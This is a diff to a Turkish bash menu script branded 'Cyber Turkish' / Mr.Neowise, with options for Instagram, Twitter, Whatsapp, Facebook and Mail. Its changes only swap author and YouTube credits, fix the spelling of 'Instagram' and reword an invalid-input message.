@@ -1,7 +1,7 @@
 #!/bin/bash
 #!/bin/sh
-#Code:Mr.Neowise
-#Youtube : Serhat Türk
+#Code: Serhat Türk
+#Youtube : Mister Neowise
 clear
 case $1 in
 
@@ -48,10 +48,10 @@ echo -e '\033[31;40;1m
 
 	   \e[35m🇹🇷★ 🇹🇷★ 🇹🇷★ 🇹🇷★ Mr.Neowise 🇹🇷★ 🇹🇷★ 🇹🇷★ 🇹🇷★	
 	 \e[31m🇹🇷★ 🇹🇷★ 🇹🇷★ 🇹🇷★ Cyber Turkish 🇹🇷★ 🇹🇷★ 🇹🇷★ 🇹🇷★	
-  \e[32m🇹🇷★ 🇹🇷★ 🇹🇷★ 🇹🇷★  İnstagram  ;  @_serhatc  🇹🇷★ 🇹🇷★ 🇹🇷★ 🇹🇷★	
+  \e[32m🇹🇷★ 🇹🇷★ 🇹🇷★ 🇹🇷★  Youtube  ;  Mister Neowise  🇹🇷★ 🇹🇷★ 🇹🇷★ 🇹🇷★	
 '
 echo -e '
-\e[31m[01]\e[32mİnstagram			\e[31m[04]\e[32mFacebook
+\e[31m[01]\e[32mInstagram			\e[31m[04]\e[32mFacebook
 \e[31m[02]\e[32mTwitter			\e[31m[05]\e[32mMail
 \e[31m[03]\e[32mWhatsapp			
 
@@ -104,7 +104,7 @@ elif [[ $islem == 00 ]]; then
 elif [[ $islem == 99 ]]; then
 	exit 1
 else
-	echo -e '\033[36;40;1m Girdiğniz İşlem Numarasını Kontrol Ediniz....'	
+	echo -e '\033[36;40;1m Girdiğniz İşlem Numarasını Kontrol Edin....'	
 	sleep 1
 	clear 
 	banner
